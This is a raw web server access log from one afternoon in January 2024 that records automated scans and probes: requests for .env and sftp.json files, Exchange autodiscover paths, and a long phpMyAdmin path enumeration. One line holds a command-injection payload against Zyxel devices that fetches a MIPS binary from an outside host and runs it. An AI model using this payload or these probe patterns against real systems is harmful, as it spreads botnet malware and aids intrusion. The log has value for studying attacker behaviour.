83.97.73.245 - - [24/Jan/2024:17:00:03 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
146.19.24.23 - - [24/Jan/2024:17:03:18 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
185.224.128.191 - - [24/Jan/2024:17:11:59 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
198.74.56.46 - - [24/Jan/2024:17:17:02 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.118 - - [24/Jan/2024:17:17:21 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.37.79.75 - - [24/Jan/2024:17:19:01 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [24/Jan/2024:17:19:01 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.163.53 - - [24/Jan/2024:17:31:11 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.34 - - [24/Jan/2024:17:31:50 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
162.243.147.4 - - [24/Jan/2024:17:50:40 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 152 "-" "Mozilla/5.0 zgrab/0.x"
54.37.79.75 - - [24/Jan/2024:17:59:23 +0000] "GET /.env HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [24/Jan/2024:17:59:23 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
84.54.51.254 - - [24/Jan/2024:17:59:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 152 "http://193.122.114.10:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
84.54.51.254 - - [24/Jan/2024:17:59:54 +0000] "" 400 0 "-" "-"
52.80.177.122 - - [24/Jan/2024:18:03:44 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 152 "-" "Go-http-client/1.1"
83.97.73.245 - - [24/Jan/2024:18:07:19 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.195.77 - - [24/Jan/2024:18:10:49 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 152 "-" "Mozilla/5.0 zgrab/0.x"
146.19.24.23 - - [24/Jan/2024:18:14:45 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
104.248.14.105 - - [24/Jan/2024:18:15:19 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xE6$\x87\xF9|\xB5\xA9\xFD\xA0\xBA\xC6x\xAC$\xDCQd4U\x0F$wk\x13\xA5\xC4\xD4HA\x7FeP c\x9Dy\xE4\xA3\xAD\xC2k\xC7\xF5n\xA5\x82\xD3C\x04\x19]\xB1\xB3ci+\x82dNA\xB0g}T\xDA\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 182 "-" "-"
104.248.14.105 - - [24/Jan/2024:18:15:20 +0000] "GET /script HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
162.142.125.225 - - [24/Jan/2024:18:27:40 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
162.142.125.225 - - [24/Jan/2024:18:27:43 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.225 - - [24/Jan/2024:18:27:44 +0000] "PRI * HTTP/2.0" 400 182 "-" "-"
162.142.125.225 - - [24/Jan/2024:18:27:45 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.225 - - [24/Jan/2024:18:27:46 +0000] "GET /icons/apple-touch-icon.png HTTP/1.1" 200 311701 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
117.184.26.242 - - [24/Jan/2024:18:37:59 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 152 "-" "Mozilla/5.0"
172.104.210.105 - - [24/Jan/2024:18:47:16 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [24/Jan/2024:18:47:35 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.71.178.53 - - [24/Jan/2024:19:21:54 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
172.71.242.82 - - [24/Jan/2024:19:22:18 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
172.71.147.95 - - [24/Jan/2024:19:22:33 +0000] "GET /posts/612a15d02864d2e8d920dac6ccf5ffe3/ HTTP/1.1" 200 28368 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
167.248.133.184 - - [24/Jan/2024:19:36:43 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.184 - - [24/Jan/2024:19:36:44 +0000] "PRI * HTTP/2.0" 400 182 "-" "-"
167.248.133.184 - - [24/Jan/2024:19:36:44 +0000] "GET /favicon.ico HTTP/1.1" 200 9662 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.184 - - [24/Jan/2024:19:36:46 +0000] "GET /icons/apple-touch-icon.png HTTP/1.1" 200 311701 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
146.19.24.23 - - [24/Jan/2024:19:39:25 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
109.199.243.66 - - [24/Jan/2024:19:59:41 +0000] "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.146/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;" 400 280 "-" "-"
172.104.210.105 - - [24/Jan/2024:20:02:38 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [24/Jan/2024:20:02:50 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
156.96.155.245 - - [24/Jan/2024:20:14:15 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:18 +0000] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:21 +0000] "GET /HNAP1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:25 +0000] "GET /hudson/script HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:25 +0000] "GET /script HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:28 +0000] "GET /sqlite/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:28 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:29 +0000] "GET /SQLiteManager/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:30 +0000] "GET /SQLite/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:30 +0000] "GET /SQlite/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:31 +0000] "GET /main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:32 +0000] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:32 +0000] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:33 +0000] "GET /agSearch/SQlite/main.php HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:35 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:35 +0000] "GET /phpMyAdmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:36 +0000] "GET /PMA/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:36 +0000] "GET /pma/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:37 +0000] "GET /admin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:38 +0000] "GET /dbadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:38 +0000] "GET /mysql/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:39 +0000] "GET /myadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:39 +0000] "GET /openserver/phpmyadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:40 +0000] "GET /phpmyadmin2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:41 +0000] "GET /phpMyAdmin2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:41 +0000] "GET /phpMyAdmin-2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:42 +0000] "GET /php-my-admin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:42 +0000] "GET /phpMyAdmin-2.2.3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:43 +0000] "GET /phpMyAdmin-2.2.6/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:44 +0000] "GET /phpMyAdmin-2.5.1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:44 +0000] "GET /phpMyAdmin-2.5.4/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:45 +0000] "GET /phpMyAdmin-2.5.5-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:46 +0000] "GET /phpMyAdmin-2.5.5-rc2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:46 +0000] "GET /phpMyAdmin-2.5.5/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:47 +0000] "GET /phpMyAdmin-2.5.5-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:47 +0000] "GET /phpMyAdmin-2.5.6-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:48 +0000] "GET /phpMyAdmin-2.5.6-rc2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:48 +0000] "GET /phpMyAdmin-2.5.6/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:49 +0000] "GET /phpMyAdmin-2.5.7/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:50 +0000] "GET /phpMyAdmin-2.5.7-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:51 +0000] "GET /phpMyAdmin-2.6.0-alpha/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:52 +0000] "GET /phpMyAdmin-2.6.0-alpha2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:52 +0000] "GET /phpMyAdmin-2.6.0-beta1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:53 +0000] "GET /phpMyAdmin-2.6.0-beta2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:53 +0000] "GET /phpMyAdmin-2.6.0-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:54 +0000] "GET /phpMyAdmin-2.6.0-rc2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:55 +0000] "GET /phpMyAdmin-2.6.0-rc3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:56 +0000] "GET /phpMyAdmin-2.6.0/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:56 +0000] "GET /phpMyAdmin-2.6.0-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:57 +0000] "GET /phpMyAdmin-2.6.0-pl2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:58 +0000] "GET /phpMyAdmin-2.6.0-pl3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:58 +0000] "GET /phpMyAdmin-2.6.1-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:14:59 +0000] "GET /phpMyAdmin-2.6.1-rc2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:00 +0000] "GET /phpMyAdmin-2.6.1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:00 +0000] "GET /phpMyAdmin-2.6.1-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:01 +0000] "GET /phpMyAdmin-2.6.1-pl2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:02 +0000] "GET /phpMyAdmin-2.6.1-pl3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:02 +0000] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:03 +0000] "GET /phpMyAdmin-2.6.2-beta1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:03 +0000] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:04 +0000] "GET /phpMyAdmin-2.6.2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:04 +0000] "GET /phpMyAdmin-2.6.2-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:05 +0000] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:06 +0000] "GET /phpMyAdmin-2.6.3-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:06 +0000] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:07 +0000] "GET /phpMyAdmin-2.6.3-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:07 +0000] "GET /phpMyAdmin-2.6.4-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:08 +0000] "GET /phpMyAdmin-2.6.4-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:09 +0000] "GET /phpMyAdmin-2.6.4-pl2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:10 +0000] "GET /phpMyAdmin-2.6.4-pl3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:10 +0000] "GET /phpMyAdmin-2.6.4-pl4/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:11 +0000] "GET /phpMyAdmin-2.6.4/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:12 +0000] "GET /phpMyAdmin-2.7.0-beta1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:12 +0000] "GET /phpMyAdmin-2.7.0-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:13 +0000] "GET /phpMyAdmin-2.7.0-pl1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:13 +0000] "GET /phpMyAdmin-2.7.0-pl2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:14 +0000] "GET /phpMyAdmin-2.7.0/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:14 +0000] "GET /phpMyAdmin-2.8.0-beta1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:15 +0000] "GET /phpMyAdmin-2.8.0-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:16 +0000] "GET /phpMyAdmin-2.8.0-rc2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:16 +0000] "GET /phpMyAdmin-2.8.0/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:17 +0000] "GET /phpMyAdmin-2.8.0.1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:17 +0000] "GET /phpMyAdmin-2.8.0.2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:18 +0000] "GET /phpMyAdmin-2.8.0.3/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:19 +0000] "GET /phpMyAdmin-2.8.0.4/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
